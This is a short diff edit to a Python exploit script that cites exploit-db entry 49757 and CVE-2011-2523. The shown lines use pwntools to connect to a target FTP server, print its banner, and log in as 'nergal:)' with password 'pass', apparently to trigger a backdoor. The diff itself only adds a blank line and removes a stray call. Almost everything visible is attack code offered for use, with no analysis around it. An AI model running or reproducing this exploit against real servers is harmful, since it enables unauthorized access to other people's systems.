@@ -2,6 +2,7 @@
 # Source: https://www.exploit-db.com/exploits/49757
 # CVE: CVE-2011-2523
 
+
 #!/usr/bin/python3
 
 import argparse
@@ -23,7 +24,6 @@ try:
     ftp = remote(ip, port, timeout=3)
 except PwnlibException:
     exit()
-ftp.recvuntil
 print("\tBanner:", ftp.recv(1024).decode().strip())
 ftp.sendline(r'USER nergal:)\n'.encode())
 ftp.sendline(r'PASS pass\n'.encode())
